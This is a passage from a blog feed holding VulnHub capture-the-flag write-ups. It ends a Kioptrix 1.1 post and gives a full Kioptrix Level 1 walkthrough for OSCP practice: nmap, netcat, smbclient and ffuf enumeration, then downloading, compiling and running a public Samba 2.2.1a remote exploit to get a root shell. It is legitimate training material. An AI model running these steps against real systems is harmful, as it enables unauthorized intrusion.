&lt;p&gt;Sweet, now let’s simply compile and run the exploit using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1.1_8.PNG&quot; alt=&quot;Root!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we successfully privilege escalated and spawned a root shell. Rooted!&lt;/p&gt;</content><author><name>Ash</name></author><category term="VulnHub" /><category term="VulnHub" /><category term="SQL Injection" /><category term="Command Injection" /><category term="Kernel Exploits" /><summary type="html">Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get a simple reverse shell. Finally, we successfully privilege escalate to root using a kernel exploit. As with the entire Kioptrix series, this challengs is pretty outdated, and the real-world applicability is questionable, but it's great OSCP prep and learning material.</summary></entry><entry><title type="html">Kioptrix Level 1 (#1) Writeup - VulnHub</title><link href="http://localhost:4000/Kioptrix-Level-1/" rel="alternate" type="text/html" title="Kioptrix Level 1 (#1) Writeup - VulnHub" /><published>2020-07-27T00:00:00-04:00</published><updated>2020-07-27T00:00:00-04:00</updated><id>http://localhost:4000/Kioptrix-Level-1</id><content type="html" xml:base="http://localhost:4000/Kioptrix-Level-1/">&lt;p&gt;In preperation for my OSCP exam, I tackled a series of VulnHub boxes, Kioptrix Level 1 being the first. In retrospect, this box is &lt;em&gt;really&lt;/em&gt;, &lt;em&gt;really&lt;/em&gt; old. Like &lt;em&gt;2010&lt;/em&gt; old, so it’s real-life applicability is questionable.&lt;/p&gt;

&lt;p&gt;It is a simple boot-to-root box that is vulnerable to a remote code execution vulnerability impacting its Samba service.&lt;/p&gt;

&lt;p&gt;It’s good baseline prep for anyone studying for their OSCP/PWK, learning Network pentesting, and trying to get some practice enumerating a box.&lt;/p&gt;

&lt;p&gt;I’ll assume you’ve already got the box running and are able to reach it. Let’s get going.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;h3 id=&quot;nmap-scans&quot;&gt;NMAP Scans&lt;/h3&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 23:04 EDT
Nmap scan report for 10.0.0.35
Host is up (0.00013s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2020-07-27T07:05:40+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:A0:57:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

Host script results:
|_clock-skew: 3h59m58s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.13 ms 10.0.0.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.55 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, we see quite a few interesting possibilities here. Let’s start from bottom to top manually enumerating each open port.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-ssh&quot;&gt;Enumerating SSH&lt;/h3&gt;

&lt;p&gt;We can use Netcat to quickly grab the service banner on port 22. You’ll notice that this appeared on NMAP scans too, but manually fingerprinting the service isn’t &lt;em&gt;always&lt;/em&gt; a waste of time.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 10.0.0.35 22
SSH-1.99-OpenSSH_2.9p2
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Which reveals that the SSH verson is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-1.99-OpenSSH_2.9p2&lt;/code&gt;. We will keep that in mind and move on to HTTP.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-http&quot;&gt;Enumerating HTTP&lt;/h3&gt;

&lt;p&gt;Browsing to the port 80 via a web browser simply displays the default Apache landing page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1_1.PNG&quot; alt=&quot;Browsing to HTTP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s fingerprint the port using netcat and try to find out what version of Apache is running:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 10.0.0.35 80
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Mon, 27 Jul 2020 07:12:21 GMT
Server: Apache/1.3.20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Red-Hat/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; mod_ssl/2.8.4 OpenSSL/0.9.6b
Last-Modified: Thu, 06 Sep 2001 03:12:46 GMT
ETag: &lt;span class=&quot;s2&quot;&gt;&quot;8805-b4a-3b96e9ae&quot;&lt;/span&gt;
Accept-Ranges: bytes
Content-Length: 2890
Connection: close
Content-Type: text/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, so we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache/1.3.20&lt;/code&gt; is running as well as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_ssl/2.8.4&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OpenSSL/0.9.6b&lt;/code&gt;. Let’s remember these version numbers for later.&lt;/p&gt;

&lt;h3 id=&quot;enumerating-smb&quot;&gt;Enumerating SMB&lt;/h3&gt;

&lt;p&gt;We’ll skip up to port 139. I’ll go ahead and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; to see if there are any shares on the machine:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SMB2 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; //10.0.0.35/
Server does not support EXTENDED_SECURITY  but &lt;span class=&quot;s1&quot;&gt;'client use spnego = yes'&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;'client ntlmv2 auth = yes'&lt;/span&gt; is &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Anonymous login successful

        Sharename       Type      Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba Server&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Reconnecting with SMB1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;workgroup listing.
Server does not support EXTENDED_SECURITY  but &lt;span class=&quot;s1&quot;&gt;'client use spnego = yes'&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;'client ntlmv2 auth = yes'&lt;/span&gt; is &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Anonymous login successful

        Server               Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        KIOPTRIX             Samba Server

        Workgroup            Master
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;            &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        MYGROUP              KIOPTRIX

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay, looks like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ADMIN$&lt;/code&gt; shares are hosted via SMB. Let’s see if we can connect to these shares:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/Kioptrix1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SMB2 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //10.0.0.35/IPC&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
Server does not support EXTENDED_SECURITY  but &lt;span class=&quot;s1&quot;&gt;'client use spnego = yes'&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;'client ntlmv2 auth = yes'&lt;/span&gt; is &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Anonymous login successful
Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;NT_STATUS_NETWORK_ACCESS_DENIED listing &lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;ein@~/VulnHub/Kioptrix1:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SMB2 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //10.0.0.35/ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
Server does not support EXTENDED_SECURITY  but &lt;span class=&quot;s1&quot;&gt;'client use spnego = yes'&lt;/span&gt; and &lt;span class=&quot;s1&quot;&gt;'client ntlmv2 auth = yes'&lt;/span&gt; is &lt;span class=&quot;nb&quot;&gt;set
&lt;/span&gt;Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No luck, let’s grab the SMB version before moving on. I’ll quickly use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_version&lt;/code&gt; Metasploit module to perform this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_version&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.0.0.35:139         - Host could not be identified: Unix &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 2.2.1a&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 10.0.0.35:445         - Scanned 1 of 1 hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;100% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Auxiliary module execution completed
msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_version&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;enumerating-https&quot;&gt;Enumerating HTTPS&lt;/h3&gt;

&lt;p&gt;Looking at port 443 with a web browser reveals the same default landing page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1_2.PNG&quot; alt=&quot;Browsing to HTTP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, it feels like a good time to go ahead and try to directory brute-force the web server.
Let’s kick this off on both port 80 and 443 while we hit some other services. We’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; for this:&lt;/p&gt;

&lt;h4 id=&quot;https&quot;&gt;HTTPS:&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://10.0.0.35/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;http&quot;&gt;HTTP:&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.0.0.35/FUZZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look at the results:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
        /&lt;span class=&quot;s1&quot;&gt;'___\  /'&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.0.35/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

#                       [Status: 200, Size: 2890, Words: 453, Lines: 87]
#                       [Status: 200, Size: 2890, Words: 453, Lines: 87]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 2890, Words: 453, Lines: 87]
# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 2890, Words: 453, Lines: 87]
# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 2890, Words: 453, Lines: 87]
#                       [Status: 200, Size: 2890, Words: 453, Lines: 87]
# This work is licensed under the Creative Commons  [Status: 200, Size: 2890, Words: 453, Lines: 87]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 2890, Words: 453, Lines: 87]
# on atleast 2 different hosts [Status: 200, Size: 2890, Words: 453, Lines: 87]
# directory-list-2.3-medium.txt [Status: 200, Size: 2890, Words: 453, Lines: 87]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 2890, Words: 453, Lines: 87]
#                       [Status: 200, Size: 2890, Words: 453, Lines: 87]
# Copyright 2007 James Fisher [Status: 200, Size: 2890, Words: 453, Lines: 87]
                        [Status: 200, Size: 2890, Words: 453, Lines: 87]
manual                  [Status: 301, Size: 294, Words: 19, Lines: 10]
usage                   [Status: 301, Size: 293, Words: 19, Lines: 10]
mrtg                    [Status: 301, Size: 292, Words: 19, Lines: 10]
                        [Status: 200, Size: 2890, Words: 453, Lines: 87]
:: Progress: [220560/220560] :: Job [1/1] :: 1086 req/sec :: Duration: [0:03:23] :: Errors: 0 ::
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Attempting to access the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mrtg&lt;/code&gt; sub-directory redirects us to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mrtg/&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc 10.0.0.35 80
GET /mrtg HTTP/1.0

HTTP/1.1 301 Moved Permanently
Date: Mon, 27 Jul 2020 07:32:55 GMT
Server: Apache/1.3.20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unix&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Red-Hat/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; mod_ssl/2.8.4 OpenSSL/0.9.6b
Location: http://127.0.0.1/mrtg/
Connection: close
Content-Type: text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1

&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;
&amp;lt;TITLE&amp;gt;301 Moved Permanently&amp;lt;/TITLE&amp;gt;
&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;
&amp;lt;H1&amp;gt;Moved Permanently&amp;lt;/H1&amp;gt;
The document has moved &amp;lt;A &lt;span class=&quot;nv&quot;&gt;HREF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1/mrtg/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;here&amp;lt;/A&amp;gt;.&amp;lt;P&amp;gt;
&amp;lt;HR&amp;gt;
&amp;lt;ADDRESS&amp;gt;Apache/1.3.20 Server at 127.0.0.1 Port 80&amp;lt;/ADDRESS&amp;gt;
&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a look using a web browser:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1_3.PNG&quot; alt=&quot;Browsing to HTTP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Interesting, it’s hosting some network monitoring software called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Multi Router Traffic Grapher (MRTG)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Unfortunately, further Googling eventually shows this is a dead end.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Let’s go back to those version numbers we grabbed during the enumeration phase. If we google the Samba version (2.2.1a), we can quickly find an &lt;a href=&quot;https://www.exploit-db.com/exploits/10&quot;&gt;interesting exploit&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is a really old exploit, but so is the box.. Let’s see if it works. We can start by grabbing it and compiling it using GCC.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://www.exploit-db.com/download/10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s remove all the garbage comments from the top, and save it with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.c&lt;/code&gt; file extension.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim 10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s compile it using GCC&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc exploit.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; exploit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To run the compiled exploit, we’ll need to specify the architecture via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-b 0&lt;/code&gt; and then the IP as the positional argument &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;Target IP&amp;gt;&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Kioptrix1_4.PNG&quot; alt=&quot;Running the exploit&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;After running the exploit, we are dropped directly into a root shell. So that’s it, rooted!&lt;/p&gt;</content><author><name>Ash</name></author><category term="VulnHub" /><category term="VulnHub" /><category term="smbclient" /><category term="ffuf" /><category term="MRTG" /><category term="Samba" /><summary type="html">Kioptrix Level 1 is a simple boot-to-root VulnHub box that is vulnerable to a remote code execution vulnerability impacting its Samba service. This box is a great beginner test to learn basic port enumeration and exploitation.</summary></entry></feed>